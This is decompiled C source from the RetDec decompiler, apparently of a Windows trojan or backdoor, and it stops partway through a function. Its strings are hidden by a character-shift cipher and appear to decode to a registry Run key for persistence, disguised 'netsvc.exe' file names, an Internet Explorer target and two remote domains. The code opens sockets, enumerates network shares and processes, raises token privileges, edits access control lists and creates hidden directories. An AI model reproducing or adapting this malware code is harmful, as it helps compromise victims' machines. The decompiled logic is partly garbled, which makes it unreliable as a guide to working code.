//
// This file was generated by the Retargetable Decompiler
// Website: https://retdec.com
// Copyright (c) 2017 Retargetable Decompiler <info@retdec.com>
//

#include <arpa/inet.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>
#include <wchar.h>
#include <windows.h>

// ------------------------ Structures ------------------------

struct WSAData {
    int16_t e0;
    int16_t e1;
    int16_t e2;
    int16_t e3;
    char * e4;
    char e5[1];
    char e6[1];
};

struct _ACL {
    char e0;
    char e1;
    int16_t e2;
    int16_t e3;
    int16_t e4;
};

struct _EXCEPTION_RECORD {
    int32_t e0;
    int32_t e1;
    struct _EXCEPTION_RECORD * e2;
    int32_t * e3;
    int32_t e4;
    int32_t e5[1];
};

struct _FILETIME {
    int32_t e0;
    int32_t e1;
};

struct _LUID {
    int32_t e0;
    int32_t e1;
};

struct _LUID_AND_ATTRIBUTES {
    struct _LUID e0;
    int32_t e1;
};

struct _M128A {
    int64_t e0;
    int64_t e1;
};

struct _CONTEXT {
    int64_t e0;
    int64_t e1;
    int64_t e2;
    int64_t e3;
    int64_t e4;
    int64_t e5;
    int32_t e6;
    int32_t e7;
    int16_t e8;
    int16_t e9;
    int16_t e10;
    int16_t e11;
    int16_t e12;
    int16_t e13;
    int32_t e14;
    int64_t e15;
    int64_t e16;
    int64_t e17;
    int64_t e18;
    int64_t e19;
    int64_t e20;
    int64_t e21;
    int64_t e22;
    int64_t e23;
    int64_t e24;
    int64_t e25;
    int64_t e26;
    int64_t e27;
    int64_t e28;
    int64_t e29;
    int64_t e30;
    int64_t e31;
    int64_t e32;
    int64_t e33;
    int64_t e34;
    int64_t e35;
    int64_t e36;
    int64_t e37;
    int32_t e38;
    struct _M128A e39[26];
    int64_t e40;
    int64_t e41;
    int64_t e42;
    int64_t e43;
    int64_t e44;
    int64_t e45;
};

struct _NETRESOURCEA {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int32_t e3;
    char * e4;
    char * e5;
    char * e6;
    char * e7;
};

struct _OSVERSIONINFOA {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int32_t e3;
    int32_t e4;
    char e5[128];
};

struct _OVERLAPPED {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int32_t * e3;
};

struct _PROCESS_INFORMATION {
    int32_t * e0;
    int32_t * e1;
    int32_t e2;
    int32_t e3;
};

struct _SECURITY_ATTRIBUTES {
    int32_t e0;
    int32_t * e1;
    bool e2;
};

struct _STARTUPINFOA {
    int32_t e0;
    char * e1;
    char * e2;
    char * e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
    int32_t e7;
    int32_t e8;
    int32_t e9;
    int32_t e10;
    int32_t e11;
    int16_t e12;
    int16_t e13;
    char * e14;
    int32_t * e15;
    int32_t * e16;
    int32_t * e17;
};

struct _TOKEN_PRIVILEGES {
    int32_t e0;
    struct _LUID_AND_ATTRIBUTES e1[1];
};

struct _TRUSTEE_A {
    struct _TRUSTEE_A * e0;
    int32_t e1;
    int32_t e2;
    int32_t e3;
    int32_t e4;
};

struct _EXPLICIT_ACCESS_A {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    struct _TRUSTEE_A e3;
};

struct _WIN32_FIND_DATAA {
    int32_t e0;
    struct _FILETIME e1;
    struct _FILETIME e2;
    struct _FILETIME e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
    int32_t e7;
    char e8[1];
    char e9[14];
    int32_t e10;
    int32_t e11;
    int16_t e12;
};

struct fd_set {
    int32_t e0;
    int32_t e1[1];
};

struct hostent {
    char * e0;
    char ** e1;
    int16_t e2;
    int16_t e3;
    char ** e4;
};

struct in_addr {
    int32_t e0;
};

struct sockaddr {
    int16_t e0;
    char e1[14];
};

struct tagPROCESSENTRY32 {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int32_t e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
    int32_t e7;
    int32_t e8;
    char e9[1];
};

struct timeval {
    int32_t e0;
    int32_t e1;
};

// ------------------- Function Prototypes --------------------

int32_t ___CxxFrameHandler(int32_t * pExcept, int32_t * pRN, int32_t * pContext, int32_t * pDC);
int32_t __controlfp(int32_t NewValue, int32_t Mask);
int32_t __EH_prolog(void);
int32_t __except_handler3(struct _EXCEPTION_RECORD * exception_record, int32_t registration, struct _CONTEXT * context, int32_t dispatcher);
void __initterm(void (**First)(), void (**Last)());
int32_t __XcptFilter(int32_t xcptnum, int32_t * pxcptinfoptrs);
int32_t * _CreateToolhelp32Snapshot(int32_t dwFlags, int32_t th32ProcessID);
int32_t * _memcpy_1(int32_t * dest, int32_t * src, int32_t n);
int32_t * _memset(int32_t * s, int32_t c, int32_t n);
bool _Process32First(int32_t * hSnapshot, struct tagPROCESSENTRY32 * lppe);
bool _Process32Next(int32_t * hSnapshot, struct tagPROCESSENTRY32 * lppe);
int32_t _SetEntriesInAclA(int32_t cCountOfExplicitEntries, struct _EXPLICIT_ACCESS_A * pListOfExplicitEntries, struct _ACL * OldAcl, struct _ACL ** NewAcl);
int32_t _SetSecurityInfo(int32_t * handle, int32_t ObjectType, int32_t SecurityInfo, int32_t * psidOwner, int32_t * psidGroup, struct _ACL * pDacl, struct _ACL * pSacl);
char * _strcat(char * dest, char * src);
int32_t _strcmp(char * s1, char * s2);
char * _strcpy(char * dest, char * src);
int32_t _strlen(char * s);
int32_t _WNetCloseEnum(int32_t * hEnum);
int32_t _WNetEnumResourceA(int32_t * hEnum, int32_t * lpcCount, int32_t * lpBuffer, int32_t * lpBufferSize);
int32_t _WNetOpenEnumA(int32_t dwScope, int32_t dwType, int32_t dwUsage, struct _NETRESOURCEA * lpNetResource, int32_t ** lphEnum);
int32_t entry_point(void);
int32_t function_401000(int32_t a1);
int32_t function_401041(void);
int32_t function_401047(char * a1);
int32_t function_401059(char * a1);
int32_t function_40106c(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_401414(struct _SECURITY_ATTRIBUTES * lpPathName);
int32_t function_401435(void);
int32_t function_401454(int32_t a1);
int32_t function_4015ab(void);
int32_t function_4015d4(int32_t lpValueName, int32_t a2);
int32_t function_4016a4(void);
int32_t function_4018c1(struct _OSVERSIONINFOA * a1);
int32_t function_4018ff(void);
int32_t function_4019e2(struct sockaddr * a1, int32_t protocol, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8);
int32_t function_401bab(void);
int32_t function_401c03(void);
int32_t function_401def(void);
int32_t function_401e4c(int32_t str, int32_t a2);
int32_t function_401e99(char * a1, int32_t a2);
int32_t function_401f45(char * a1, int32_t a2);
int32_t function_402006(void);
int32_t function_40205c(void);
int32_t function_40216f(void);
int32_t function_4022eb(void);
int32_t function_4023c2(void);
int32_t function_402508(void);
int32_t function_40267d(char * str, int32_t str3, int32_t a3, int32_t str5, int32_t a5, int32_t a6);
int32_t function_40277e(int32_t sock);
int32_t function_402830(int32_t a1, int32_t a2, char * a3, int32_t result);
int32_t function_402859(void);
int32_t function_4028cc(char * name, int32_t a2, int32_t a3, int32_t a4);
int32_t function_4028eb(void);
int32_t function_402aa7(void);
int32_t function_402d8f(void);
int32_t function_402ece(void);
int32_t function_402f2f(char * a1, int32_t result);
int32_t function_402f9b(void);
int32_t function_4030c7(void);
int32_t function_40328d(int32_t * a1, int32_t a2);
int32_t function_403319(int32_t * TokenHandle, int32_t lpName, int32_t PreviousState);
int32_t function_403379(int32_t * TokenHandle, int32_t NewState);
int32_t function_40338e(int32_t ** a1, int32_t dwDesiredAccess);
int32_t function_4034cb(char * str);
int32_t function_403587(void);
int32_t function_403887(int32_t * a1);
int32_t function_4038e7(int32_t dwProcessId);
int32_t function_403b42(void);
int32_t function_403cd5(int32_t * hFindFile, int32_t lpFindFileData);
int32_t function_403d21(char * lpFileName);
int32_t function_403d8d(int32_t a1);
int32_t function_403dda(char * a1);
int32_t function_4047d2(struct _FILETIME * lpFileName);
int32_t function_404889(void);
int32_t function_404905(void);
int32_t function_404b80(int32_t a1, int32_t a2);
int32_t function_404ba8(int16_t * str2, int32_t a2);
int32_t function_404dde(int32_t a1, struct fd_set * str3);
int32_t function_404fd1(struct timeval * a1, int32_t a2, int32_t a3, int32_t a4, int32_t str, int32_t a6);
int32_t function_40511a(struct _STARTUPINFOA * str);
int32_t function_405908(int32_t * hKey, int32_t a2, int32_t lpValueName, int32_t dwType, int32_t lpData, int32_t cbData, int32_t a7);
int32_t function_405957(int32_t * hKey, int32_t lpSubKey, int32_t lpSubKey2);
int32_t function_405a10(void);
int32_t function_405b84(void);
void function_405b98(int32_t Code);
int32_t function_405bb0(void);
int32_t function_405bc5(void);
int32_t function_405bf4(void);

// --------------------- Global Variables ---------------------

int32_t g1 = 0; // eax
int32_t g2 = 0; // ebp
int32_t g3 = 0; // ebx
int32_t g4 = 0; // ecx
int32_t g5 = 0; // edi
int32_t g6 = 0; // esi
int32_t g7 = 0; // esp
int32_t g8 = 0x402b93;
int32_t g9 = 0x35ff006a;
int32_t g10 = 0x706f754f;
char * g11 = "\x4c\x6e\x6b\x63\x6e\x5d\x69\x1c\x42\x65\x68\x61\x6f";
struct tagPROCESSENTRY32 * g12 = (struct tagPROCESSENTRY32 *)0x706a4558;
char g13[2] = "\\";
int32_t g14 = 41;
int32_t g15 = 40;
char g16[2] = ".";
int16_t * g17 = (int16_t *)0x49939393;
char * g18 = "\x93\x93\x93\x37\x6c\xc0\xde\xd1\xe0\x93\x93\x93\x93\x8b\x94\x5b\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x6c\x6d\x93\x93\x83\x93\x9f\x6c\x93\x37\x93\x97\x82\x99\x93\x93\x93\x93\x93\x93\x93\xb3\x93\x93\x93\x93\x93\x47\x93\x93\x13\xfa\x93\xdd\xc7\xdf\xde\xc0\xc0\xc3\x93\x92\x93\x93\x93\x04\x11\x9b\x73\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\xc4\x93\xfa\x93\xfd\x93\xf7\x93\xfc\x93\xe4\x93\xe0\x93\xb3\x93\xa1\x93\xa3\x93\xa3\x93\xa3\x93\xb3\x93\xa1\x93\xa2\x93\xaa\x93\xa6\x93\x93\x93\xc4\x93\xfa\x93\xfd\x93\xf7\x93\xfc\x93\xe4\x93\xe0\x93\xb3\x93\xa1\x93\xa3\x93\xa3\x93\xa3\x93\xb3\x93\xa6\x93\xbd\x93\xa3\x93\x93\x93\x93\x93";
int16_t * g19 = (int16_t *)0x16939393;
int32_t g20 = 0;
int32_t g21 = 0;
int32_t g22 = 0;
char * g23;
int32_t g24 = 0;
int32_t g25 = 0;
int32_t g26 = 0;
struct _WIN32_FIND_DATAA * g27 = NULL;
struct _WIN32_FIND_DATAA * g28 = NULL;
char g29 = 0;
char g30 = 0;
struct _NETRESOURCEA * g31 = NULL;
int32_t g32 = 0;
int32_t g33 = 0;
struct fd_set * g34 = NULL;
char * g35;
int32_t ** g36 = NULL;
int32_t g37 = 0;
int32_t g38 = 0;
int32_t g39 = 0;
int32_t g40 = 0;
int32_t g41 = 0;
int32_t g42 = 0;
int32_t g43 = 0;
int32_t g44 = 0;
int32_t g45 = 0;
int32_t g46 = 0;
char * g47;
struct _SECURITY_ATTRIBUTES * g48 = NULL;
char * g49;
char * g50;
int32_t g51 = 0;
int32_t g52 = 0;
struct timeval * g53 = NULL;
int32_t g54 = 0;
int32_t g55 = 0;
int32_t g56 = 0;
struct timeval * g57 = NULL;
int16_t g58 = 0;
char * g59;
int16_t g60 = 0;
char * g61;
int32_t g62 = 0;
char * g63;
char * g64;
char g65 = 0;
struct _OVERLAPPED * g66 = NULL;
int32_t g67 = 0;
struct timeval * g68 = NULL;

// ------------------------ Functions -------------------------

// Address range: 0x401000 - 0x401040
int32_t function_401000(int32_t a1) {
    // entry
    __EH_prolog();
    *(int32_t *)(g2 - 4) = 0;
    int32_t v1 = g5; // bp-16
    *(int32_t *)(g2 - 16) = (int32_t)&v1;
    if (function_40106c(v1, g6, g3, g4) != 0) {
        // 0x401023
        function_402508();
        WSACleanup();
        // branch -> 0x401030
    }
    // 0x401030
    abort();
    // UNREACHABLE
}

// Address range: 0x401041 - 0x401046
int32_t function_401041(void) {
    // 0x401041
    return 0x401028;
}

// Address range: 0x401047 - 0x401058
int32_t function_401047(char * a1) {
    int32_t result = (int32_t)a1; // 0x401047
    unsigned char v1 = *a1; // 0x40104b3
    int32_t v2 = g4 & -256 | (int32_t)v1; // 0x40104b7
    if (v1 == 0) {
        // 0x401058
        return result;
    }
    g4 = v2;
    unsigned char v3 = (char)v2 + 1; // 0x401051
    *(char *)result = v3;
    int32_t result2 = result + 1; // 0x401055
    unsigned char v4 = *(char *)result2; // 0x40104b
    int32_t v5 = ((int32_t)v3 | v2 & -256) & -256 | (int32_t)v4; // 0x40104b
    g4 = v5;
    while (v4 != 0) {
        // 0x401051
        v2 = v5;
        v3 = (char)v2 + 1;
        *(char *)result2 = v3;
        result2++;
        v4 = *(char *)result2;
        v5 = ((int32_t)v3 | v2 & -256) & -256 | (int32_t)v4;
        g4 = v5;
        // continue -> 0x401051
    }
    // 0x401058
    return result2;
}

// Address range: 0x401059 - 0x40106b
int32_t function_401059(char * a1) {
    int32_t result = (int32_t)a1; // 0x401059
    unsigned char v1 = *a1; // 0x40105d2
    int32_t v2 = g4 & -256 | (int32_t)v1; // 0x40105d6
    if (v1 == 0) {
        // 0x40106b
        return result;
    }
    g4 = v2;
    unsigned char v3 = (char)v2 + 4; // 0x401063
    *(char *)result = v3;
    int32_t result2 = result + 1; // 0x401068
    unsigned char v4 = *(char *)result2; // 0x40105d
    int32_t v5 = ((int32_t)v3 | v2 & -256) & -256 | (int32_t)v4; // 0x40105d
    g4 = v5;
    while (v4 != 0) {
        // 0x401063
        v2 = v5;
        v3 = (char)v2 + 4;
        *(char *)result2 = v3;
        result2++;
        v4 = *(char *)result2;
        v5 = ((int32_t)v3 | v2 & -256) & -256 | (int32_t)v4;
        g4 = v5;
        // continue -> 0x401063
    }
    // 0x40106b
    return result2;
}

// Address range: 0x40106c - 0x401413
int32_t function_40106c(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    int32_t lpThreadId = g4; // bp-4
    int32_t v1 = g3; // 0x40106d
    int32_t v2 = g2; // 0x40106e
    int32_t v3 = g6; // 0x40106f
    int32_t v4 = g5; // 0x401070
    function_401059("&ha_j]?&");
    function_401059("Okbps]naXIe_nkokbpX?qnnajpJapEjb");
    function_401059("OUOPAIX?qnnajp?kjpnkhOapX?kjpnkhXHo]");
    function_401059("Okbps]naXIe_nkokbpXSej`ksoX?qnnajpRanoekjXLkhe_eaoXAtlhknanXNqj");
    function_401059("Ie_nkokbpVf");
    g2 = (int32_t)"Hd^mjnjao@sdo";
    function_401059("Hd^mjnjao@sdo");
    function_401059("Ie_nkokbpD]raAtep");
    g3 = (int32_t)"Hd^mjnjaoC\\q`<^f";
    function_401059("Hd^mjnjaoC\\q`<^f");
    function_401059("EATLHKNA*ATA");
    function_401059("+ran*dpi");
    function_401059("+ata*dpi");
    function_401059("+]ll*dpi");
    function_401059("+iu]ll*dpi");
    function_401059("+dkopheop*dpi");
    int32_t str2 = (int32_t)"*]\\f)coh"; // edi
    function_401059("*]\\f)coh");
    function_401059("+OkiaQlHeop*dpi");
    function_401059("+OkiaQlRan*dpi");
    function_401059("sss*bhua]chao*_ki");
    function_401059("sss*gi)ju_*_ki");
    function_401059("EATLHKNA*ATA");
    int32_t str = (int32_t)"+naopkna"; // esi
    function_401059("+naopkna");
    function_401059("+`evde*ceb");
    function_401059("+_kjja_p*ceb");
    function_401059("X JpQjejop]hhG>5,,3.3 ");
    function_401059("Xjapor_*ata");
    function_401059("Xjapo_r*ata");
    function_401059("Xjapor_o*ata");
    function_401059((char *)&g10);
    function_401059((char *)&g11);
    function_401059((char *)&g12);
    function_401059("bkn_acqaop");
    function_401047((char *)g2);
    function_401047((char *)str2);
    function_401047((char *)(int32_t (*)(int32_t *))g3);
    function_401059("=q`ekLknp");
    function_401059("=q`ekLknp*ouo");
    function_401059("OUOPAIX?qnnajp?kjpnkhOapXOanre_ao");
    function_401059("OUOPAIX?kjpnkhOap,,-XOanre_ao");
    function_401059("OUOPAIX?kjpnkhOap,,.XOanre_ao");
    function_401059("X`neranoX");
    function_401059("X@neranJqi*`]p");
    strcpy((char *)&g50, "sss*bhua]chao*_ki");
    strcpy((char *)&g49, "sss*gi)ju_*_ki");
    strcpy((char *)&g48, "EATLHKNA*ATA");
    strcpy((char *)&g47, (char *)str);
    strcat((char *)&g47, "+`evde*ceb");
    strcpy((char *)&g46, (char *)str);
    strcat((char *)&g46, "+_kjja_p*ceb");
    strcpy((char *)&g45, (char *)str);
    strcat((char *)&g45, "+ran*dpi");
    strcpy((char *)&g44, (char *)str);
    strcat((char *)&g44, "+ata*dpi");
    strcpy((char *)&g39, (char *)str);
    strcat((char *)&g39, "+OkiaQlRan*dpi");
    strcpy((char *)&g38, (char *)str);
    strcat((char *)&g38, "+OkiaQlHeop*dpi");
    strcpy((char *)&g43, (char *)str);
    strcat((char *)&g43, "+]ll*dpi");
    strcpy((char *)&g42, (char *)str);
    strcat((char *)&g42, "+iu]ll*dpi");
    strcpy((char *)&g41, (char *)str);
    strcat((char *)&g41, "+dkopheop*dpi");
    strcpy((char *)&g40, (char *)str);
    strcat((char *)&g40, (char *)str2);
    g6 = *(int32_t *)0x406114;
    g5 = 0;
    int32_t lpEventAttributes = g5; // 0x40136b
    g22 = (int32_t)CreateEventA(NULL, false, false, (char *)g2);
    int32_t lpEventAttributes2 = g5; // 0x401376
    g21 = (int32_t)CreateEventA((struct _SECURITY_ATTRIBUTES *)(int32_t (*)(int32_t *))lpEventAttributes, (lpEventAttributes & 1) != 0, (lpEventAttributes & 1) != 0, "Ie_nkokbpD]raAtep");
    g20 = (int32_t)CreateEventA((struct _SECURITY_ATTRIBUTES *)(int32_t (*)(int32_t *))lpEventAttributes2, (lpEventAttributes2 & 1) != 0, (lpEventAttributes2 & 1) != 0, (char *)g3);
    if (function_401435() == 0) {
        // 0x4013ee
        // branch -> 0x40140e
        // 0x40140e
        g5 = v4;
        g6 = v3;
        g2 = v2;
        g3 = v1;
        return 0;
    }
    // 0x40138e
    function_4018c1((struct _OSVERSIONINFOA *)&g61);
    g59 = (char *)(int32_t)(function_4018ff() != 0);
    function_401454(g5);
    function_4016a4();
    function_402859();
    function_402006();
    function_4022eb();
    function_4023c2();
    g6 = 0x6b74;
    int32_t mem = (int32_t)malloc(0x2000); // 0x4013d3
    g32 = mem;
    if (mem != g5) {
        int32_t * mem2 = malloc(0x2000); // 0x4013e2
        g31 = (struct _NETRESOURCEA *)mem2;
        if ((int32_t)mem2 != g5) {
            // 0x4013f2
            function_4015ab();
            CreateThread((struct _SECURITY_ATTRIBUTES *)g5, g5, (int32_t (*)(int32_t *))&g9, (int32_t *)g5, g5, &lpThreadId);
            // branch -> 0x40140e
            // 0x40140e
            g5 = v4;
            g6 = v3;
            g2 = v2;
            g3 = v1;
            return 1;
        }
    }
    // 0x4013ee
    // branch -> 0x40140e
    // 0x40140e
    g5 = v4;
    g6 = v3;
    g2 = v2;
    g3 = v1;
    return 0;
}

// Address range: 0x401414 - 0x401434
int32_t function_401414(struct _SECURITY_ATTRIBUTES * lpPathName) {
    // 0x401414
    CreateDirectoryA((char *)lpPathName, NULL);
    int32_t v1 = GetFileAttributesA((char *)lpPathName); // 0x401423
    return SetFileAttributesA((char *)(int32_t)lpPathName, v1 & 249 | 0x1000000 * v1 / 0x1000000 & -256 | 6);
}

// Address range: 0x401435 - 0x401453
int32_t function_401435(void) {
    int32_t v1 = 0; // bp-400
    return WSAStartup(2, (struct WSAData *)&v1) != 0 ? 2 : 1;
}

// Address range: 0x401454 - 0x4015aa
int32_t function_401454(int32_t a1) {
    int32_t v1 = g3; // bp-656
    int32_t lpReserved = 0; // ebx
    int32_t v2 = g5; // 0x401461
    int32_t lpcbData = 128; // bp-12
    int32_t v3 = 0; // esi
    int32_t phkResult; // bp-8
    RegCreateKeyExA(HKEY_LOCAL_MACHINE, "Okbps]naXIe_nkokbpX?qnnajpJapEjb", 0, (char *)&g68, 0, 0x2001f, NULL, (int32_t **)&phkResult, NULL);
    char lpData; // bp-140
    int32_t v4 = &lpData; // 0x401491
    int32_t v5 = RegQueryValueExA(&((struct timeval *)phkResult)->e0, "pid", (int32_t *)lpReserved, &((struct _SECURITY_ATTRIBUTES *)lpReserved)->e0, &lpData, &lpcbData); // 0x4014a2
    int32_t v6; // eax
    int32_t lpFilename; // bp-652
    int32_t lpReserved2; // 0x401558
    int32_t v7; // 0x40157d
    int32_t lpData2; // 0x401585
    int32_t result; // 0x4015aa
    int32_t v8; // 0x4015aa31
    int32_t v9; // 0x401519
    int32_t v10; // 0x401592
    int32_t v11; // 0x401563
    int32_t str; // 0x4014f7
    int32_t v12; // 0x401521
    unsigned char v13; // 0x401503
    int32_t v14; // 0x401508
    unsigned char v15; // 0x401519
    int32_t v16; // 0x401525
    int32_t time_val; // 0x40156e
    unsigned char v17; // 0x401521
    int32_t hKey; // 0x401598
    int32_t v18; // 0x40151b
    if (v5 != lpReserved) {
        // 0x4014d3
        GetModuleFileNameA(&((struct _SECURITY_ATTRIBUTES *)lpReserved)->e0, (char *)&lpFilename, 512);
        str = (int32_t)strrchr((char *)&lpFilename, 92) + 1;
        strcpy((char *)&g35, (char *)str);
        v13 = *(char *)str;
        v14 = lpReserved;
        int32_t v19 = v14;
        int32_t v20 = v14; // 0x40152f
        if (v13 != (char)v14) {
            // 0x40150f
            v6 = str;
            int32_t v21 = str; // 0x40151e
            v9 = g4 & -256 | (int32_t)v13;
            int32_t v22 = v14;
            // branch -> 0x401519
            while (true) {
                // 0x401519
                v15 = (char)v9 + 1;
                v18 = v22 + 1;
                *(char *)(v4 - str + v21) = v15;
                v12 = v6 + 1;
                v17 = *(char *)v12;
                v6 = v12;
                v16 = lpReserved;
                if (v17 != (char)v16) {
                  lab_0x401519_2:
                    // 0x401519
                    v21 = v12;
                    v9 = ((int32_t)v15 | v9 & -256) & -256 | (int32_t)v17;
                    v22 = v18;
                    // branch -> 0x401519
                    continue;
                } else {
                    v19 = v18;
                    v20 = v16;
                }
            }
        }
        // 0x401529
        *(char *)(v19 - 136 + g2) = (char)v20;
        RegSetValueExA(&((struct timeval *)phkResult)->e0, "pid", lpReserved, 1, &lpData, lpcbData);
        // branch -> 0x40154e
        // 0x40154e
        lpReserved2 = lpReserved;
        v11 = RegQueryValueExA(&((struct timeval *)phkResult)->e0, "hostid", (int32_t *)lpReserved2, &((struct _SECURITY_ATTRIBUTES *)lpReserved2)->e0, (char *)&g36, &lpcbData);
        v8 = 0;
        if (v11 != 0) {
            // 0x40156d
            time_val = time((int32_t *)lpReserved);
            srand(time_val);
            v7 = rand();
            lpData2 = (int32_t)&g36;
            g36 = (int32_t **)v7;
            v10 = RegSetValueExA(&((struct timeval *)phkResult)->e0, (char *)(int32_t)"hostid", lpReserved, 4, (char *)lpData2, 4);
            v8 = v10;
            // branch -> 0x401598
        }
        // 0x401598
        hKey = phkResult;
        g5 = v2;
        g3 = v1;
        if (hKey != lpReserved) {
            // 0x4015a0
            result = RegCloseKey((int32_t *)hKey);
            // branch -> 0x4015a9
        } else {
            result = v8;
        }
        // 0x4015a9
        return result;
    }
    char v23 = lpData; // 0x4014ac
    int32_t v24 = v3;
    int32_t v25 = lpReserved; // 0x4014cb
    if (v23 == (char)lpReserved) {
        // 0x4014c8
        *(char *)(v24 + (int32_t)&g35) = (char)v25;
        if (v25 != a1) {
            // 0x4014c8
            // branch -> 0x4014d3
            // 0x4014d3
            GetModuleFileNameA(&((struct _SECURITY_ATTRIBUTES *)lpReserved)->e0, (char *)&lpFilename, 512);
            str = (int32_t)strrchr((char *)&lpFilename, 92) + 1;
            strcpy((char *)&g35, (char *)str);
            v13 = *(char *)str;
            v14 = lpReserved;
            if (v13 != (char)v14) {
                // 0x40150f
                v9 = g4 & -256 | (int32_t)v13;
                // branch -> 0x401519
                while (true) {
                    // 0x401519
                    v15 = (char)v9 + 1;
                    v18 = v14 + 1;
                    *(char *)(v4 - str + str) = v15;
                    v12 = str + 1;
                    v17 = *(char *)v12;
                    v6 = v12;
                    v16 = lpReserved;
                    if (v17 != (char)v16) {
                        goto lab_0x401519_2;
                    }
                    // 0x401529
                    *(char *)(v18 - 136 + g2) = (char)v16;
                    RegSetValueExA(&((struct timeval *)phkResult)->e0, "pid", lpReserved, 1, &lpData, lpcbData);
                    // branch -> 0x40154e
                    // 0x40154e
                    lpReserved2 = lpReserved;
                    v11 = RegQueryValueExA(&((struct timeval *)phkResult)->e0, "hostid", (int32_t *)lpReserved2, &((struct _SECURITY_ATTRIBUTES *)lpReserved2)->e0, (char *)&g36, &lpcbData);
                    v8 = 0;
                    if (v11 != 0) {
                        // 0x40156d
                        time_val = time((int32_t *)lpReserved);
                        srand(time_val);
                        v7 = rand();
                        lpData2 = (int32_t)&g36;
                        g36 = (int32_t **)v7;
                        v10 = RegSetValueExA(&((struct timeval *)phkResult)->e0, (char *)(int32_t)"hostid", lpReserved, 4, (char *)lpData2, 4);
                        v8 = v10;
                        // branch -> 0x401598
                    }
                    // 0x401598
                    hKey = phkResult;
                    g5 = v2;
                    g3 = v1;
                    if (hKey != lpReserved) {
                        // 0x4015a0
                        result = RegCloseKey((int32_t *)hKey);
                        // branch -> 0x4015a9
                    } else {
                        result = v8;
                    }
                    // 0x4015a9
                    return result;
                }
            }
            // 0x401529
            *(char *)(v14 - 136 + g2) = (char)v14;
            RegSetValueExA(&((struct timeval *)phkResult)->e0, "pid", lpReserved, 1, &lpData, lpcbData);
            // branch -> 0x40154e
        }
        // 0x40154e
        lpReserved2 = lpReserved;
        v11 = RegQueryValueExA(&((struct timeval *)phkResult)->e0, "hostid", (int32_t *)lpReserved2, &((struct _SECURITY_ATTRIBUTES *)lpReserved2)->e0, (char *)&g36, &lpcbData);
        v8 = 0;
        if (v11 != 0) {
            // 0x40156d
            time_val = time((int32_t *)lpReserved);
            srand(time_val);
            v7 = rand();
            lpData2 = (int32_t)&g36;
            g36 = (int32_t **)v7;
            v10 = RegSetValueExA(&((struct timeval *)phkResult)->e0, (char *)(int32_t)"hostid", lpReserved, 4, (char *)lpData2, 4);
            v8 = v10;
            // branch -> 0x401598
        }
        // 0x401598
        hKey = phkResult;
        g5 = v2;
        g3 = v1;
        if (hKey != lpReserved) {
            // 0x4015a0
            result = RegCloseKey((int32_t *)hKey);
            // branch -> 0x4015a9
        } else {
            result = v8;
        }
        // 0x4015a9
        return result;
    }
    int32_t v26 = (int32_t)v23 | v5 & -256; // 0x4014b6
    unsigned char v27 = (char)v26 - 1; // 0x4014b6
    *(char *)(v24 + (int32_t)&g35) = v27;
    int32_t v28 = v3; // 0x4014be
    unsigned char v29 = *(char *)(g2 - 135 + v28); // 0x4014be
    int32_t v30 = v28 + 1; // 0x4014c5
    v25 = lpReserved;
    while (v29 != (char)lpReserved) {
        // 0x4014b6
        v26 = ((int32_t)v27 | v26 & -256) & -256 | (int32_t)v29;
        v27 = (char)v26 - 1;
        *(char *)(v30 + (int32_t)&g35) = v27;
        v28 = v30;
        v29 = *(char *)(g2 - 135 + v28);
        v30 = v28 + 1;
        v25 = lpReserved;
        // continue -> 0x4014b6
    }
    // 0x4014c8
    *(char *)(v30 + (int32_t)&g35) = (char)v25;
    if (v25 != a1) {
        // 0x4014c8
        // branch -> 0x4014d3
        // 0x4014d3
        GetModuleFileNameA(&((struct _SECURITY_ATTRIBUTES *)lpReserved)->e0, (char *)&lpFilename, 512);
        str = (int32_t)strrchr((char *)&lpFilename, 92) + 1;
        strcpy((char *)&g35, (char *)str);
        v13 = *(char *)str;
        v14 = lpReserved;
        if (v13 != (char)v14) {
            // 0x40150f
            v9 = g4 & -256 | (int32_t)v13;
            // branch -> 0x401519
            while (true) {
                // 0x401519
                v15 = (char)v9 + 1;
                v18 = v14 + 1;
                *(char *)(v4 - str + str) = v15;
                v12 = str + 1;
                v17 = *(char *)v12;
                v6 = v12;
                v16 = lpReserved;
                if (v17 != (char)v16) {
                    goto lab_0x401519_2;
                }
                // 0x401529
                *(char *)(v18 - 136 + g2) = (char)v16;
                RegSetValueExA(&((struct timeval *)phkResult)->e0, "pid", lpReserved, 1, &lpData, lpcbData);
                // branch -> 0x40154e
                // 0x40154e
                lpReserved2 = lpReserved;
                v11 = RegQueryValueExA(&((struct timeval *)phkResult)->e0, "hostid", (int32_t *)lpReserved2, &((struct _SECURITY_ATTRIBUTES *)lpReserved2)->e0, (char *)&g36, &lpcbData);
                v8 = 0;
                if (v11 != 0) {
                    // 0x40156d
                    time_val = time((int32_t *)lpReserved);
                    srand(time_val);
                    v7 = rand();
                    lpData2 = (int32_t)&g36;
                    g36 = (int32_t **)v7;
                    v10 = RegSetValueExA(&((struct timeval *)phkResult)->e0, (char *)(int32_t)"hostid", lpReserved, 4, (char *)lpData2, 4);
                    v8 = v10;
                    // branch -> 0x401598
                }
                // 0x401598
                hKey = phkResult;
                g5 = v2;
                g3 = v1;
                if (hKey != lpReserved) {
                    // 0x4015a0
                    result = RegCloseKey((int32_t *)hKey);
                    // branch -> 0x4015a9
                } else {
                    result = v8;
                }
                // 0x4015a9
                return result;
            }
        }
        // 0x401529
        *(char *)(v14 - 136 + g2) = (char)v14;
        RegSetValueExA(&((struct timeval *)phkResult)->e0, "pid", lpReserved, 1, &lpData, lpcbData);
        // branch -> 0x40154e
    }
    // 0x40154e
    lpReserved2 = lpReserved;
